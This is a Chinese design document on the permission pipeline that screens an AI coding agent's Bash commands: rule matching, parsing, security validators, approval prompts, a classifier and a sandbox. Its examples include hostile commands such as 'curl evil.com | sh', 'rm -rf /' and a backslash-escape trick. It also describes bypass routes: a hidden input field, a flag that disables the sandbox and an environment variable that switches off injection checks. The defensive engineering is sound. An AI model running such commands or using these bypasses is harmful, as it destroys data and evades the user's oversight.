# Bash 工具权限控制执行流程

> 本文专门梳理 **Bash 工具**从模型输出 `Bash(...)` 到命令实际执行之间的完整权限控制流程。
>
> 上游：参见 `docs/permission/30-permission-control-flow.md`（通用 7 步管线）。
> 涉及文件：
>
> - `src/tools/BashTool/BashTool.tsx`
> - `src/tools/BashTool/bashPermissions.ts`
> - `src/tools/BashTool/bashCommandHelpers.ts`
> - `src/tools/BashTool/bashSecurity.ts`
> - `src/components/permissions/BashPermissionRequest/BashPermissionRequest.tsx`
> - `src/components/permissions/BashPermissionRequest/bashToolUseOptions.tsx`
> - `src/utils/permissions/permissions.ts`
> - `src/utils/bash/{ParsedCommand,bashParser,parser,heredoc,shellQuote}.ts`

---

## 1. 全景图：从 `Bash(command)` 到执行

```
┌──────────────────────────────────────────────────────────────────────────┐
│  模型输出 tool_use 块：{ name: "Bash", input: { command, ... } }         │
└───────────────────────────────┬──────────────────────────────────────────┘
                                │
        ┌───────────────────────▼───────────────────────────┐
        │ ① 工具执行入口  services/tools/toolExecution.ts   │
        │    - validateInput → hook PreToolUse              │
        └───────────────────────┬───────────────────────────┘
                                │
        ┌───────────────────────▼───────────────────────────┐
        │ ② CanUseToolFn → hasPermissionsToUseTool         │
        │    (通用 7 步管线，详见 30-permission-control-flow)│
        │    - rule deny / rule ask / tool.checkPermissions│
        │    - bypass 模式 / 整工具 allow 规则             │
        │    - passthrough → ask 转换                       │
        └───────────────────────┬───────────────────────────┘
                                │
        ┌───────────────────────▼───────────────────────────┐
        │ ③ BashTool.checkPermissions                      │
        │    = bashToolHasPermission()                     │
        │    ┌────────────────────────────────────────────┐ │
        │    │  a) cd+git 复合命令拦截                     │ │
        │    │  b) AST/正则 解析 → pipe 段                 │ │
        │    │  c) bashToolCheckPermission(单条命令)       │ │
        │    │     ├─ exact 匹配（deny/ask/allow）         │ │
        │    │     ├─ prefix 匹配（deny/ask/allow）         │ │
        │    │     ├─ checkPathConstraints                 │ │
        │    │     ├─ checkSedConstraints                  │ │
        │    │     ├─ checkPermissionMode (acceptEdits)    │ │
        │    │     └─ BashTool.isReadOnly                  │ │
        │    │  d) checkCommandAndSuggestRules             │ │
        │    │     └─ bashCommandIsSafeAsync               │ │
        │    │        (24+ 细粒度 validator)               │ │
        │    │  e) subcommandResults 聚合                   │ │
        │    └────────────────────────────────────────────┘ │
        └───────────────────────┬───────────────────────────┘
                                │
                                ▼
              ┌────────────┬────────────┬────────────┐
              │  allow     │   ask      │  deny      │
              └─────┬──────┴─────┬──────┴─────┬──────┘
                    │            │            │
                    │            ▼            ▼
                    │   ┌────────────────────────┐
                    │   │ ④ BashPermissionRequest │
                    │   │  渲染 UI 选项           │
                    │   │  (yes / prefix /       │
                    │   │   classifier / no)     │
                    │   └────────────┬───────────┘
                    │                ▼
                    │      用户选择 → 生成 PermissionUpdate
                    │      更新 settings.json & React state
                    ▼
              ┌────────────────────────────────┐
              │ ⑤ BashTool.call() 实际执行      │
              │    - shellQuote 安全拼装        │
              │    - sandbox（如启用）          │
              │    - execFile / LocalShellTask  │
              └────────────────────────────────┘
```

---

## 2. 入口与通用管线

### 2.1 工具调用前的入口

模型发出 `Bash` 工具调用请求后，工具执行流程会经过这些关卡：

1. **`validateInput(input)`**（BashTool 实现中可选）：基本合法性检查。
2. **`PreToolUse` Hook 链**：用户配置的命令/JS/Prompt 钩子，可 deny / modify / allow。
3. **`CanUseToolFn`** = `hasPermissionsToUseTool`（`src/utils/permissions/permissions.ts:562`）。
4. 在 `bypassPermissions` 模式 + 无 hook 干预时，**3 步后就允许**；否则进入完整 7 步管线。

### 2.2 通用 7 步管线（针对 Bash 的视角）

参考 `docs/permission/30-permission-control-flow.md` 详细描述。对 Bash 而言：

| 步骤 | 对 Bash 的影响 |
| --- | --- |
| 1a 整工具 deny | `Bash` 工具本身被 deny → 返回 deny |
| 1b 整工具 ask | `Bash` 工具本身被 ask（沙箱可豁免） |
| **1c 工具自身** | **`BashTool.checkPermissions(input, ctx)`**（下文重点） |
| 1d 工具自身 deny | `checkPermissions` 直接返回 `deny`（如 `rm -rf /`） |
| 1e 需要用户交互 | Bash 不需要，但其他工具可能 |
| 1f 内容级 ask 规则 | 优先级高于 bypass 模式 |
| 1g 安全检查 | 路径类（`.git/`、`.claude/` 等） |
| 2a bypass 模式 | `bypassPermissions` 或带 `isBypassPermissionsModeAvailable` 的 plan |
| 2b 整工具 allow | 形如 `"Bash"`（无前缀）的规则命中 |

Bash 工具的核心差异化逻辑集中在 **step 1c** —— 它返回的 `PermissionResult` 直接决定了后续步骤的走向。

---

## 3. `BashTool.checkPermissions` 的内部实现

`src/tools/BashTool/bashPermissions.ts` 中的 `bashToolHasPermission` 是 Bash 工具的权限决策核心。整体流程：

```
bashToolHasPermission(input, context)
   │
   ├─ 1) sed 编辑检测（parseSedEditCommand）
   │     命中 → 走 SedEditPermissionRequest 特例路径
   │
   ├─ 2) 解析 + 拆分复合命令
   │     - 优先使用 AST（tree-sitter）解析
   │     - 回退到 shell-quote + splitCommand
   │     - checkCommandOperatorPermissions
   │       ├─ 检测 subshell / command group → ask（不安全复合命令）
   │       └─ 按 pipe 拆分成 segments
   │
   ├─ 3) cd+git 复合命令拦截
   │     "cd <path> && git ..." 类 → ask
   │     防止 bare repository 攻击
   │
   ├─ 4) 重读 appState（按用户最新切换的模式重算）
   │
   ├─ 5) 对每个 subcommand 调用 bashToolCheckPermission
   │     收集 subcommandResults
   │
   ├─ 6) 任何子命令 deny → 整体 deny
   │
   ├─ 7) 在 ORIGINAL 命令上验证 output redirection（path 之外）
   │
   └─ 8) 任何子命令 ask → 整体 ask
```

### 3.1 `bashToolCheckExactMatchPermission`（精确匹配）

`src/tools/BashTool/bashPermissions.ts:991` —— 先查整命令是否被规则匹配：

| 命中 | 行为 |
| --- | --- |
| deny 规则 | `behavior: 'deny'`，附 `decisionReason.type: 'rule'` |
| ask 规则 | `behavior: 'ask'` |
| allow 规则 | `behavior: 'allow'`，附 `updatedInput` |
| 无匹配 | `passthrough`，附 `suggestionForExactCommand` 建议 |

### 3.2 `bashToolCheckPermission`（逐条子命令）

`src/tools/BashTool/bashPermissions.ts:1050` —— 对单条命令做完整评估：

```
1. exact 匹配（deny/ask 命中即返回）
2. prefix 匹配（deny/ask 命中即返回）
3. checkPathConstraints
4. exact/prefix allow 命中 → allow
5. checkSedConstraints（危险 sed 拦截）
6. checkPermissionMode（acceptEdits 等模式放行）
7. BashTool.isReadOnly（read-only 命令自动放行）
8. passthrough + suggestions
```

### 3.3 `checkPathConstraints`

`src/tools/BashTool/pathValidation.ts:1013` —— 路径级约束：

- 拒绝写到工作目录之外（除非 `additionalWorkingDirectories` 显式允许）
- 拒绝写到敏感目录（`.git/`、`.claude/`、`.vscode/`、`~/.ssh/` 等）
- 拒绝 shell config 文件（`.bashrc`、`.zshrc` 等）
- 优先使用 AST 解析的 argv，避免 shell-quote 单引号 bug 绕过

### 3.4 复合命令的 AST 拆分

`src/tools/BashTool/bashCommandHelpers.ts` 的 `checkCommandOperatorPermissions`：

1. 通过 `ParsedCommand.parse(input.command)` 获取 IParsedCommand
2. 检测 subshell / command group → 视为不安全复合命令，**强制 ask**（不提供 allow 建议）
3. 否则按 `|` 拆分成 segments，**逐段独立**走 `bashToolCheckPermission`
4. 子命令决策合并为 `subcommandResults: Map<string, PermissionResult>`

> 关键：复合命令下，**deny 规则优先于 path 约束**（参见 `bashPermissions.ts:2230` 的 SECURITY FIX 注释），
> 否则用户可在 `Bash(ls:*)` deny 规则下用 `ls /etc/passwd` 绕过。

---

## 4. 安全检查链 `bashCommandIsSafeAsync`

`src/tools/BashTool/bashSecurity.ts` 提供 24+ 个细粒度 validator，在 `checkCommandAndSuggestRules` 中（`bashPermissions.ts:1183`）按顺序执行。

**入口策略**：

```typescript
// bashPermissions.ts:1218
if (!astParseSucceeded && !CLAUDE_CODE_DISABLE_COMMAND_INJECTION_CHECK) {
    const safetyResult = await bashCommandIsSafeAsync(input.command)
    if (safetyResult.behavior !== 'passthrough') {
        return { behavior: 'ask', suggestions: [] }
    }
}
```

- AST 解析成功 → **跳过** 安全检查（tree-sitter 已经验证结构）
- AST 解析失败 → 跑完整 validator 链
- 环境变量 `CLAUDE_CODE_DISABLE_COMMAND_INJECTION_CHECK=1` 可禁用

### 4.1 早期（Early）validator

这些返回 `allow` 时直接短路为 `passthrough`（即视为"安全，无需权限检查"）：

| Validator | 行为 | 说明 |
| --- | --- | --- |
| `validateEmpty` | 空命令 → allow | |
| `validateIncompleteCommands` | 开头 tab / `-` / `&&` 等 → ask | 不完整命令片段 |
| `validateSafeCommandSubstitution` | `$(cat <<'EOF'...)` 模式 → allow | 安全 heredoc 替换 |
| `validateGitCommit` | `git commit -m "..."` 无 shell 注入 → allow | |

### 4.2 主体 validator 链（按执行顺序）

| 顺序 | Validator | 检测 | subId / checkId |
| --- | --- | --- | --- |
| 1 | `validateJqCommand` | `jq system()`、`-f/--rawfile/--slurpfile` 等危险 flag | JQ_SYSTEM_FUNCTION / JQ_FILE_ARGUMENTS |
| 2 | `validateObfuscatedFlags` | ANSI-C 引用 `$'...'`、locale 引用 `$"..."`、空引号 + dash 拼接、quote-chain flag 混淆 | OBFUSCATED_FLAGS (1-11) |
| 3 | `validateShellMetacharacters` | 引用内嵌 `;`, `\|`, `&`（含 find/grep 的 -name/-path） | SHELL_METACHARACTERS |
| 4 | `validateDangerousVariables` | `$VAR` 在重定向 / pipe 位置 | DANGEROUS_VARIABLES |
| 5 | `validateCommentQuoteDesync` | `# comment` 后跟引号 → 跟踪器失同步 | COMMENT_QUOTE_DESYNC |
| 6 | `validateQuotedNewline` | 引号内换行 + 下一行以 `#` 开头 → stripCommentLines 隐藏参数 | QUOTED_NEWLINE |
| 7 | `validateCarriageReturn` | DQ 外的 `\r` → shell-quote/bash tokenization 差异 | NEWLINES subId 2 |
| 8 | `validateNewlines` | 换行后接非空白 → 隐藏多命令 | NEWLINES subId 1 |
| 9 | `validateIFSInjection` | `$IFS` / `${...IFS...}` 模式 | IFS_INJECTION |
| 10 | `validateProcEnvironAccess` | `/proc/*/environ` 路径 | PROC_ENVIRON_ACCESS |
| 11 | `validateDangerousPatterns` | 反引号、`<()`, `>()`, `=()`, `$(`, `${`, `$[`, `~[`, `(e:`, `(+`, `}<always>`, `<#` 等命令替换 | DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION |
| 12 | `validateRedirections` | 输入/输出重定向 `<`, `>` | DANGEROUS_PATTERNS_INPUT/OUTPUT_REDIRECTION |
| 13 | `validateBackslashEscapedWhitespace` | `\<space>` / `\<tab>` → 路径穿越 | BACKSLASH_ESCAPED_WHITESPACE |
| 14 | `validateBackslashEscapedOperators` | `\;`, `\|`, `\&`, `\<`, `\>` → splitCommand 双重解析 bug | BACKSLASH_ESCAPED_OPERATORS |
| 15 | `validateUnicodeWhitespace` | Unicode 空白（U+00A0, U+2000-U+200A 等） | UNICODE_WHITESPACE |
| 16 | `validateMidWordHash` | 词中 `#`（非 `${#`）→ shell-quote 视为注释 | MID_WORD_HASH |
| 17 | `validateBraceExpansion` | 未引用 `{a,b}` / `{1..5}` → shell 展开为多参数 | BRACE_EXPANSION |
| 18 | `validateZshDangerousCommands` | `zmodload`/`emulate -c`/`fc -e`/zsh module builtins | ZSH_DANGEROUS_COMMANDS |
| 19 | `validateMalformedTokenInjection` | shell-quote 不平衡 token + 命令分隔符 | MALFORMED_TOKEN_INJECTION |

### 4.3 重要分类：misparsing vs nonMisparsing

`bashSecurity.ts:2343` 区分两种 ask 结果：

- **misparsing 触发**（`isBashSecurityCheckForMisparsing: true`）：
  表示 shell-quote 的解析结果与 bash 实际行为不一致，是真实的安全漏洞。
  在 `bashPermissions.ts` 的 gate 里**强制拦截**，不进入主流程。
- **nonMisparsing 触发**（不带 flag）：
  表示检测到危险但 shell-quote 与 bash 行为一致（如 `>`、`<` 重定向），
  在 validator 链中被 `defer` 收集，只在所有 misparsing validator 都没命中时才返回。

这种 defer 机制防止 `cat safe.txt \; echo /etc/passwd > ./out` 这样的攻击
先被 `validateRedirections`（nonMisparsing）截胡而漏掉
`validateBackslashEscapedOperators`（misparsing）。

### 4.4 安全 heredoc 白名单

`isSafeHeredoc` (`bashSecurity.ts:317`) 提供一个**严格可证明**的早 allow 路径：
必须是 `$(cat <<'DELIM'...DELIM)` 形式，且：

- 定界符被单引号包裹或反斜杠转义
- 关闭定界符单独占行（或 inline `DELIM)`）
- $() 不在命令名位置
- 余下文本只含 `[a-zA-Z0-9 \t"'.\-/_@=,:+~]`
- 余下文本**递归**通过 `bashCommandIsSafe_DEPRECATED`

不满足任一条件 → 回退到主 validator 链。

---

## 5. 用户交互：UI 与选项

### 5.1 `BashPermissionRequest` 组件

`src/components/permissions/BashPermissionRequest/BashPermissionRequest.tsx`

组件渲染逻辑：

1. 解析 `input.command` + `description`
2. 若匹配 `parseSedEditCommand` → 走 `SedEditPermissionRequest`
3. 否则渲染 `BashPermissionRequestInner`
4. 内部用 `useAppState(s => s.toolPermissionContext)` 取当前规则上下文
5. 通过 `useShellPermissionFeedback` 管理 input 模式（yes/no with feedback）
6. 用 `usePermissionExplainerUI` 提供"为什么需要批准"的解释

### 5.2 选项生成：`bashToolUseOptions`

`src/components/permissions/BashPermissionRequest/bashToolUseOptions.tsx:31`

根据 `suggestions`、`decisionReason`、`classifierDescription` 等参数动态生成选项：

| 选项 | 行为 | 写入位置 | 触发条件 |
| --- | --- | --- | --- |
| `yes` | 一次性允许当前命令 | 不写 | 始终显示 |
| `yes-apply-suggestions` | 允许并应用后端建议规则 | 由后端决定 | 有 suggestions 时 |
| `yes-prefix-edited` | 允许并写入用户编辑的 prefix 规则（如 `npm run:*`） | `localSettings` | 非 compound 命令、有 prefix 候选 |
| `yes-classifier-reviewed` | 允许并写入用户描述的规则（基于 classifier） | `session` | `BASH_CLASSIFIER` 启用 |
| `no` | 拒绝当前命令 | 不写 | 始终显示 |

### 5.3 规则持久化与 React state

用户选择后：

1. 调用 `toolUseConfirm.onAllow(input, permissionUpdates)`
2. `permissionUpdates: PermissionUpdate[]` 描述要添加的规则
3. `applyPermissionUpdate` 更新 `toolPermissionContext` 的内存 state
4. 对 `localSettings`/`userSettings`/`projectSettings`：通过 `addPermissionRuleToSettings` 写入 `settings.json`
5. 对 `session` / `cliArg`：仅内存

随后该命令（以及同规则命中的命令）下次会被 `bashToolCheckPermission` 步骤 2a/2b 直接 allow。

---

## 6. 沙箱、Hook 与特殊情况

### 6.1 沙箱（Bash-specific）

- `SandboxManager.isSandboxingEnabled()` 决定是否启用沙箱
- `SandboxManager.isAutoAllowBashIfSandboxedEnabled()` 决定"被沙箱化的命令是否可自动允许"
- 在通用管线 step 1b：如果开启，被沙箱化的命令可豁免整工具 ask 规则
- 在 Bash.checkPermissions 内：通过 `checkSandboxAutoAllow` 进一步放行
- 通过 `dangerouslyDisableSandbox: true`（模型侧）可绕过沙箱，但本身仍要走权限

### 6.2 Hook

- `PreToolUse` Hook：可返回 `allow` / `deny` / `ask` / `passthrough`
  - 返回 `allow` → `resolveHookPermissionDecision` 仍会跑 `checkRuleBasedPermissions`
    （即 hook 允许后规则 deny 仍生效；hook 允许后规则 ask 仍弹窗）
  - 返回 `deny` → 跳过 canUseTool，直接拒绝
- `PermissionRequest` Hook：仅在 headless / async agent 模式下被调用
  - 可自动允许（带 `updatedPermissions`，会被持久化）
  - 可 deny 并选择 `interrupt`（abort 会话）
- 详见 `src/services/tools/toolHooks.ts`

### 6.3 Classifier（auto 模式）

在 `auto` 模式下，ask 结果会进一步走 YOLO Classifier：

1. acceptEdits fast-path：先用 acceptEdits 重跑 `tool.checkPermissions`（跳过 Agent/REPL）
2. `isAutoModeAllowlistedTool(tool.name)` 白名单快速 allow
3. 否则调用 `classifyYoloAction` → allow / deny / 上限达 → ask 让用户接管
4. 累计连续拒绝达 `DENIAL_LIMITS` → throw AbortError（headless）或 ask（CLI）

### 6.4 headless / async agent

- 先执行 `runPermissionRequestHooksForHeadlessAgent` 遍历 PermissionRequest hook
- 所有 hook 都没决定 → 自动 deny（`asyncAgent` 原因）

### 6.5 dontAsk 模式

ask 直接转为 deny，附 `DONT_ASK_REJECT_MESSAGE`。

---

## 7. 关键路径上的安全设计要点

### 7.1 内部字段必须从 schema 隐藏

`BashTool.tsx:284-294`：

```typescript
// Always omit _simulatedSedEdit from the model-facing schema.
const inputSchema = lazySchema(() => isBackgroundTasksDisabled ? fullInputSchema().omit({
    run_in_background: true,
    _simulatedSedEdit: true
}) : fullInputSchema().omit({
    _simulatedSedEdit: true
}));
```

`_simulatedSedEdit` 是 `SedEditPermissionRequest` 在用户批准 sed 编辑预览后注入的内部字段。
**暴露在 schema 中**会让模型把 `command: "echo hi"` 与 `_simulatedSedEdit: { filePath: "/etc/passwd", ... }` 配对，
从而绕过权限检查和沙箱直接写文件。

### 7.2 危险 bash 复合命令（subshell）

`bashCommandHelpers.ts:208` `bashToolCheckCommandOperatorPermissions`：

```typescript
if (isUnsafeCompound) {
    return { behavior: 'ask', /* 不提供 allow 建议 */ }
}
```

subshell `$(...)` 和 command group `{ ... }` 我们无法在子命令粒度上做规则匹配，
因此**强制 ask 且不让用户保存规则**——避免用户错误地批准一个永久规则。

### 7.3 双重解析防护

`splitCommand` 会规范化 `\;` 为 `;`。
如果下游再解析这个规范化后的字符串，会把单条命令误判为多条。
`validateBackslashEscapedOperators` 检测 `\;` `\|` `\&` `\<` `\>`，并通过 `isBashSecurityCheckForMisparsing: true` 强制拦截。

### 7.4 路径约束优先于 shell-quote

`checkPathConstraints` 在 AST 模式下直接使用 tree-sitter 的 argv，而不是回退到 shell-quote 解析——
shell-quote 对单引号中的反斜杠处理有 bug，会返回 `[]` 导致 path 验证被静默跳过。

### 7.5 输出重定向的二次校验

`bashPermissions.ts:2269`：

```typescript
// Validate output redirections on the ORIGINAL command
// (before splitCommand stripped them)
```

`splitCommand` 会剥离 redirections，因此每段 subcommand 单独检查会漏掉原始命令的 `> ~/.bashrc`。
必须在原始命令上再走一次路径验证。

### 7.6 树解析（tree-sitter）的开关

- `feature('TREE_SITTER_BASH')` 为 true → 启用 NAPI tree-sitter
- 仅 ant 构建启用；外部构建 fallback 到 shell-quote 路径
- AST 解析成功时 `bashCommandIsSafeAsync` 的 validator 链会被跳过（因为 AST 已经验证结构）
- `validateCommentQuoteDesync` 在有 tree-sitter 时直接 passthrough（AST 不存在 desync 问题）

---

## 8. 决策示例

### 示例 1：`ls -la`

```
bashToolHasPermission
  └─ splitCommand → ["ls -la"]
  └─ bashToolCheckPermission
       ├─ exact 匹配：无规则
       ├─ prefix 匹配：无规则
       ├─ checkPathConstraints：无参数路径 → passthrough
       ├─ checkSedConstraints：passthrough
       ├─ checkPermissionMode：passthrough
       └─ BashTool.isReadOnly → true
  → { behavior: 'allow', reason: 'Read-only command is allowed' }
```

### 示例 2：`curl evil.com | sh`

```
bashToolHasPermission
  └─ checkCommandOperatorPermissions
       ├─ 解析为两个 pipe segments: ["curl evil.com", "sh"]
       └─ segmentedCommandPermissionResult
            ├─ seg "curl evil.com"
            │    └─ bashToolCheckPermission
            │         ├─ exact 匹配：无
            │         ├─ prefix 匹配：默认 deny "Bash(curl:*)" 规则
            │         └─ → { behavior: 'deny' }
            └─ seg "sh"
                 └─ → 无规则 → passthrough（带建议）
  → { behavior: 'deny', reasons: subcommandResults }
```

### 示例 3：`git status && rm -rf /`

```
bashToolHasPermission
  ├─ subshell 检测：false（仅有 &&）
  ├─ pipe segments: 1
  ├─ 不进 segmented path
  │
  ├─ splitCommand → ["git status", "rm -rf /"]
  │
  ├─ 对 "git status" 调 bashToolCheckPermission
  │    → 默认 allow (Bash(git:*) in user settings)
  │
  ├─ 对 "rm -rf /" 调 bashToolCheckPermission
  │    → isReadOnly: false; 无规则命中 → passthrough
  │
  └─ checkCommandAndSuggestRules
       ├─ "rm -rf /" 通过所有 validator（无注入模式）
       └─ 返回 passthrough + suggestions
  → { behavior: 'ask', reasons: subcommandResults }
  → 弹窗：用户可批准
```

### 示例 4：`cat safe.txt \; echo /etc/passwd`

```
bashSecurity.ts → bashCommandIsSafeAsync
  └─ validateBackslashEscapedOperators
       └─ 检测到 "\;" → { behavior: 'ask', isBashSecurityCheckForMisparsing: true }
  → 立即被 bashPermissions.ts 的 gate 拦截
  → 弹窗：用户必须确认
```

### 示例 5：`git commit -m "fix: minor"`

```
bashSecurity.ts → bashCommandIsSafeAsync
  └─ validateGitCommit (early)
       └─ 匹配 /^git[ \t]+commit[ \t]+[^\n]*?-m[ \t]+(['"])(.*)\1$/
       └─ 无 $() / ` / ${} / 操作符 / unquoted redirect
       └─ → { behavior: 'allow' }
  → short-circuit 为 passthrough（视为安全）
  → 如果没有更具体的规则，再走通用管线
```

---

## 9. 完整调用链速查

| 层 | 函数 | 文件:行 | 决策 |
| --- | --- | --- | --- |
| 0 | `toolExecution` | `src/services/tools/toolExecution.ts` | 调用入口 |
| 1 | `validateInput` | `src/Tool.ts:489` | 输入合法性 |
| 1 | `executePreToolHooks` | `src/utils/hooks.ts` | PreToolUse hook |
| 2 | `hasPermissionsToUseTool` | `src/utils/permissions/permissions.ts:562` | 通用 7 步 |
| 2 | `resolveHookPermissionDecision` | `src/services/tools/toolHooks.ts:385` | hook 结果分流 |
| 3 | `BashTool.checkPermissions` | `src/Tool.ts:500` | 工具自身规则 |
| 3 | `bashToolHasPermission` | `src/tools/BashTool/bashPermissions.ts:1664` | 拆分 + 聚合 |
| 3 | `checkCommandOperatorPermissions` | `src/tools/BashTool/bashCommandHelpers.ts:181` | subshell/pipe 拆分 |
| 3 | `bashToolCheckPermission` | `src/tools/BashTool/bashPermissions.ts:1050` | 单条命令评估 |
| 3 | `bashToolCheckExactMatchPermission` | `src/tools/BashTool/bashPermissions.ts:991` | 精确匹配 |
| 3 | `checkPathConstraints` | `src/tools/BashTool/pathValidation.ts:1013` | 路径级约束 |
| 3 | `checkSedConstraints` | `src/tools/BashTool/bashPermissions.ts` | sed 危险操作 |
| 3 | `checkPermissionMode` | `src/tools/BashTool/bashPermissions.ts` | 模式放行 |
| 3 | `BashTool.isReadOnly` | `src/Tool.ts:404` | read-only 命令放行 |
| 3 | `checkCommandAndSuggestRules` | `src/tools/BashTool/bashPermissions.ts:1183` | 注入安全检查 |
| 3 | `bashCommandIsSafeAsync` | `src/tools/BashTool/bashSecurity.ts:2426` | 24+ validator 链 |
| 3 | `ParsedCommand.parse` | `src/utils/bash/ParsedCommand.ts:310` | tree-sitter / regex |
| 4 | `BashPermissionRequest` | `src/components/permissions/BashPermissionRequest/BashPermissionRequest.tsx` | UI 弹窗 |
| 4 | `bashToolUseOptions` | `src/components/permissions/BashPermissionRequest/bashToolUseOptions.tsx:31` | 选项生成 |
| 4 | `onAllow(input, permissionUpdates)` | `src/types/permissions.ts` | 规则持久化 |
| 5 | `BashTool.call` | `src/tools/BashTool/BashTool.tsx` | 实际执行 |
| 5 | `SandboxManager` | `src/services/security/` | 沙箱 |
| 5 | `LocalShellTask` | `src/tasks/LocalShellTask/` | shell 进程 |

---

## 10. 调试技巧

1. **查看决策**：`Ctrl-D` 切换 `PermissionDecisionDebugInfo`（`BashPermissionRequest.tsx:305`）
2. **查看命令解析**：`logEvent('tengu_bash_security_check_triggered', { checkId, subId })` 配合 analytics
3. **禁用注入检查**：`CLAUDE_CODE_DISABLE_COMMAND_INJECTION_CHECK=1`（仅外部构建有效）
4. **查看规则来源**：`docs/permission/40-permission-system-design.md` 中的规则源清单
5. **追溯回退路径**：`src/tools/BashTool/bashCommandHelpers.ts` 的 tree-sitter vs regex fallback
6. **理解短路径**：`getFirstWordPrefix` / `getSimpleCommandPrefix`（`BashPermissionRequest.tsx:227`）

---

## 11. 相关文档

- `docs/permission/30-permission-control-flow.md` — 通用 7 步管线
- `docs/permission/40-permission-system-design.md` — 权限系统整体设计
- `docs/architecture/17-architecture.md` — 系统架构
- `docs/architecture/20-request-flow.md` — 请求流
- `src/utils/bash/bashParser.ts` — 内置纯 TS parser
- `src/utils/bash/ParsedCommand.ts` — 解析抽象
- `src/utils/bash/parser.ts` — tree-sitter 入口
